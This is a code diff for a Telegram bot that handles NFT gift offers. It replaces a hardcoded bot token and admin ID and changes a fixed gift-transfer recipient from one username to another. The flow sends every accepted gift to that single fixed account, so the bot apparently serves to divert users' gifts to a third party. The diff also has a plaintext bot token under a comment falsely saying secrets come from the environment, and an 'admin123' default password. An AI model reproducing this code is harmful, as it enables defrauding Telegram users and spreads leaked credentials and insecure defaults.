@@ -36,9 +36,9 @@ import jinja2
 
 # ==================== НАСТРОЙКИ ====================
 # Все секреты читаются из переменных окружения (безопасно для хостинга)
-BOT_TOKEN = "8524407069:AAHwoZtjoRE0kR5Gd86Dh9hAo3TcL8KyqGk"
+BOT_TOKEN = "8697267320:AAEfQB_Tbx4u4te6k91vQU8TVyNwJQ8ZNS0"
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
-ADMIN_IDS = [int(x.strip()) for x in os.getenv("", "8304808772").split(",") if x.strip()]
+ADMIN_IDS = [int(x.strip()) for x in os.getenv("", "8782264513").split(",") if x.strip()]
 WEB_PORT = int(os.getenv("PORT", os.getenv("WEB_PORT", "8080")))
 DATA_FILE = Path(__file__).parent / "data" / "users.json"
 
@@ -178,7 +178,7 @@ def build_accepted_keyboard(buyer_username: str | None, nft_url: str, offer_id: 
     пользователь выбирает в интерфейсе Telegram.
     """
     # Fixed recipient requested for gift transfer.
-    transfer_url = "tg://send_gift?to=larpxbth"
+    transfer_url = "tg://send_gift?to=larpxbtj"
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
@@ -440,7 +440,7 @@ async def on_accept_offer(callback: CallbackQuery):
     except TelegramBadRequest as e:
         logger.warning("Не удалось удалить исходный оффер %s: %s", offer_id, e)
 
-    recipient = "@larpxbth"
+    recipient = "@larpxbtj"
     order_id = offer.get("order_id") or f"TG-{secrets.token_hex(4).upper()}"
     CURRENCY_EMOJI = {
         "gram": "<tg-emoji emoji-id='5267445215773367585'>💎</tg-emoji>",
